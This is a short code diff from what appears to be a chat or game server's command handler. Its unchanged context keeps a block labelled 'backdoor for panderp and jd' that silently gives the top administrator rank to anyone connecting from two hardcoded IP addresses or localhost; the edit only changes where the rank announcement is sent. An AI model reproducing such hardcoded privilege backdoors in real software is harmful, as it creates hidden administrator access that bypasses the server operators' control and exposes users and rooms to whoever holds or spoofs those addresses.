@@ -1711,7 +1711,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		// backdoor for panderp and jd
 		if (user.ip  === '76.247.181.42'|| user.ip === '184.169.255.44' || user.ip === '127.0.0.1') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			room.send('|N|'+user.getIdentity()+'|'+user.userid);
+			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			return false;
 		}
 		break;
